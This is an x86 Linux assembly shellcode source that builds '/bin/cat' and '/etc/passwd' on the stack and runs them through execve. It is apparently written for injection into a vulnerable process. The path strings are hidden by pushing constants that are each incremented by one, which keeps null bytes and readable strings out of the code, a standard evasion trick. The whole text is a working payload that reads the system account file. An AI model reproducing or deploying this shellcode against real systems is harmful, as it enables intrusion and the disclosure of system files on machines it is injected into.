global _start

section .text

_start:
        xor ebx, ebx    ; Zero out EBX
        mul ebx         ; Zero out EAX and EDX
        push edx        ; Push EDX (0x0) onto the stack => Null terminator

        mov esi, 0x7461632e
        inc esi
        push esi
        mov esi, 0x6e69622e
        inc esi
        push esi
        mov ebx, esp    ; EBX = /bin/cat
        push edx        ; Null terminator

        mov esi, 0x64777372
        inc esi
        push esi
        mov esi, 0x61702f2e
        inc esi
        push esi
        mov esi, 0x6374652e
        inc esi
        push esi
        mov ecx, esp    ; ECX = /etc/passwd
        mov al, 11      ; EAX = execve()

        push edx        ; Null terminator (0x0)
        push ecx        ; /etc/passwd
        push ebx        ; /bin/cat
        mov ecx, esp    ; ['/bin/cat', '/etc/passwd', '0x0']
        int 0x80        ; Execute execve()